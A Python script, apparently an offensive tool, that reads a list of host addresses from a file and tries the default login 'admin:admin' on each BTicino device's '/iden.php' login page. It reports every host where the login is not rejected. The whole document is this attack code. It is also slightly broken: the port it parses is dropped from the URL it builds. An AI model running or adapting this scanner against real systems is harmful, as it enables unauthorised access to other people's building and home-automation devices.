import requests, re,ssl , os , sys
import urllib.request
import urllib.error
class bticinoExploit:
    def biticinoExploit(self):
        pass
    def bticinoBruteForce(self):
        ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
        pathOs = os.path.abspath(os.path.dirname(sys.argv[0]))
        pattern_1 = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
        pattern_2 = r'(\:).*'
        upHost = open(pathOs + '/Host/up_host.txt', 'r').read().splitlines()
        a = 0
        while a < len(upHost):
            try:
                res = upHost[a]
                match1 = re.search(pattern_1, res)
                match2 = re.search(pattern_2, res)
                host = match1.group()
                port_raw = match2.group()
                port = port_raw[1:]
                head = b'login=admin&password=admin&B1.y=0&B1.x=0&PERMISSION='
                url='https://' + str(host) + ':' +  "/iden.php"
                pageAction = urllib.request.urlopen(url, head, context=ctx)
                r = pageAction.read()
                if b'errati' in r or b'Wrong' in r or b'incorrectos' in r or b'incorrect' in r or b'Falsches' in r:
                    pass
                else:
                    print("[-]Found "+ url + " with password admin:admin")
            except KeyboardInterrupt:
                pass
            except requests.exceptions.ConnectionError:
                pass
            except IndexError:
                pass
            except AttributeError:
                pass
            except urllib.error.HTTPError:
                pass
            except urllib.error.URLError:
                pass
            except TimeoutError:
                break
            a += 1
